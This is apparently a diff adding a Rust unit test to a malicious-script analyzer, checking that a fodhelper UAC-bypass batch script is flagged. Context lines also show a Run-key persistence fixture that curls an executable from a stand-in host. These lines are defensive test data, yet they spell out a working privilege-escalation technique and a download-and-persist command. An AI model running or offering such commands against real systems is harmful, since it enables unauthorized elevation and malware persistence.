@@ -2306,6 +2306,33 @@ C:\Users\Public\rg.tmp add "HKLM\software\Microsoft\Windows NT\CurrentVersion\Wi
     }
 
     #[test]
+    fn copied_uac_auto_elevator_alias_is_manipulated_exec() {
+        let script = br#"copy C:\Windows\System32\fodhelper.exe C:\Users\Public\fh.tmp
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d calc.exe /f
+C:\Users\Public\fh.tmp
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\fh.tmp"#)
+            )),
+            "copied UAC auto-elevator alias was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UacBypass { technique } if technique == "fodhelper"
+            )),
+            "copied fodhelper UAC bypass was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn reg_add_run_key_unquoted_data_captures_full_child_command() {
         let script = br#"@echo off
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d cmd.exe /c curl -o out.exe https://reg-unquoted.example/p.exe /f
